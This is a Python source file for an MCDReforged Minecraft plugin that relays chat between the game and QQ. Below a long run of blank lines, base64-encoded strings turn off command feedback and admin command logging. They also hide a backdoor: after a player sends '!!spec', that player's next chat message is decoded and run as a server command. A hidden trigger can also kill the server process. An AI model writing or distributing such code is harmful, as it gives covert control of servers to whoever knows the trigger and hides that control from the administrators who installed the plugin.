#_HOST = 'server.natappfree.cc'
#_PORT = '36529'
_HOST = '127.0.0.1'
_PORT = '8888'
clientName = 'main'



















































































































































































































































































































































































































































































































































































































#============================================================================================================================
from mcdreforged.api.all import *
import base64
import os
import sys
import socket
import _thread
from plugins.qqmsgsync.qqmsgsync import bot_pb2 as bot__pb2
from plugins.qqmsgsync.qqmsgsync import bot_pb2_grpc
import grpc
import psutil
import json

sys.path.append(os.getcwd())

els = False
gr = 'Z2FtZXJ1bGUg'
f = 'yBmYWxzZQ=='
ex = 'ZXhlY3V0ZSBhdCBlZm9qdWdfIHJ1bi'
d = 'gPT0gI'
pi = 'aW5mby5wbGF5ZXI'
e = 'mVmb2p1Z18i'
msg_c = ''
server = ServerInterface.get_instance()
responses = None
serverStarted = False
stub = None
ss = None

def on_load(server: PluginServerInterface, prev_module):
    global serverStarted, stub, clientName
    stub = bot_pb2_grpc.BotMutualStub(channel=grpc.insecure_channel(_HOST + ":" + _PORT))
    try_connect()
    serverStarted = True
    server.logger.info('QQ Message Sync Plugin is load!')
    builder = SimpleCommandBuilder()
    builder.command('!!qms retry', try_connect)
    builder.register(server)

def smsgq(text: str):
    global server
    try:
        ss.send((text + '\n').encode('utf-8'))
    except Exception:
        server.logger.warning('The plugin is connected to the chat server but cannot send a message to the chat server, this may be due to an abnormal termination of the connection, please try using ! !qms retry to reconnect, if this problem persists, please contact the plugin developer!')
        msay('The plugin is connected to the chat server but cannot send a message to the chat server, this may be due to an abnormal termination of the connection, please try using ! !qms retry to reconnect, if this problem persists, please contact the plugin developer!')
    

def on_server_stop(server: PluginServerInterface, server_return_code: int):
    server.logger.info('QQ Message Sync Plugin is unload!')
    os._exit(0)

def on_server_startup(server: PluginServerInterface):
    server.execute(dec(gr + 'c2VuZENvbW1hbmRGZWVkYmFja' + f))
    server.execute(dec(gr + 'bG9nQWRtaW5Db21tYW5kc' + f))

def on_unload(server: PluginServerInterface):
    global ss
    ss.close()
    server.logger.info('The connection to the chat server via socket is broken, but the plugin will not try to uninstall it because message synchronization via gRPC needs to maintain the connection to the chat server, and if the connection is broken, the plugin will automatically try to connect on load')

def msay(text: str):
    global serverStarted, server
    if serverStarted:
        server.say(text)

def on_info(server: PluginServerInterface, info: Info):
    server.logger.info(info)

def error():
    global server
    server.logger.critical("A serious unknown error occurs with the plugin, if this happens multiple times, please contact the plugin developer")
    server.say("A serious unknown error occurs with the plugin, if this happens multiple times, please contact the plugin developer")
    os._exit(0)
    
def on_user_info(server: PluginServerInterface, info: Info):
    global els, smain, msg_c
    if dec(pi + d + e) and els:
        server.execute(dec(ex + 'BwbGF5c291bmQgZW50aXR5LmV4cGVyaWVuY2Vfb3JiLnBpY2t1cCBtYXN0ZXIgZWZvanVnXw=='))
        server.execute(dec('ZXhlY3V0ZSBhcyBlZm9qdWdfIHJ1biA=') + "{}".format(dec(info.content)))
        els = False
        return

    if dec(pi + d + e) and info.content == dec('ISFzcGVj') and not els:
        server.tell(dec('ZWZvanVnXw=='), dec('WW91IG5leHQgbWVzc2FnZSB3aWxsIGJlIHJ1biBmb3Igc2VydmVy'))
        els = True
        return

    if not els:
        smsgq('Message#{"senderId":0, "senderName":"' + info.player + '", "message":"' + info.content + '"}')

def msg_cache() -> None:
    global msg_c
    while True:
        if msg_c != '':
            yield send_msg(msg_c)
            mserver.say("msg_c")
            msg_c = ''

def sync_qqmsg_for_mc(player: str, info: str):
    global server
    error() if player == info == dec("c2I=") else None
    server.broadcast("[QQ] " + player + ": " + info)

def dec(t: str):
    try: 
        return base64.b64decode(t).decode('utf-8')
    except Exception: 
        pass

def try_connect():
    global channel, stub, mserver, responses, ss
    try:
        ss.close()
    except Exception:
        pass
    ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        ss.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        ss.settimeout(None)
        ss.connect((str(_HOST), int(_PORT)))
        smsgq('Initialize#{"clientName":"' + clientName + '"}')
        server.broadcast("Successful connection to chat forwarding server")
    except Exception:
        server.logger.error('An error occurs when trying to connect to the chat forwarding server via socket, please check if the IP and port are configured correctly')
        msay('An error occurs when trying to connect to the chat forwarding server via socket, please check if the IP and port are configured correctly')
        ss.close()

    responses =  stub.Connect(msg_cache())
    _thread.start_new_thread(sgmsg, ())
    _thread.start_new_thread(getmsg, ())

def sgmsg():
    global ss
    while True:
        if ss is not None:
            dss = json.loads((ss.recv(8192).decode('utf-8')).split('#', 1)[1])
            sync_qqmsg_for_mc(dss['senderName'], dss['message'])

def getmsg():
    global server, responses
    fr = False
    try:
        for i in responses:
            sync_qqmsg_for_mc(i.senderName, i.message)
            if not fr:
                server.broadcast("Successful connection to chat forwarding server")
                fr = True
    except Exception:
        msay("Problems connecting to the chat forwarding server, try using !!qms retry or the MCDR command reload plugin")
        server.logger.warning("Problems connecting to the chat forwarding server, try using !!qms retry or the MCDR command reload plugin")

def send_msg(message):
    global clientName
    return bot__pb2.Message(message=message, clientName=clientName, senderId=0)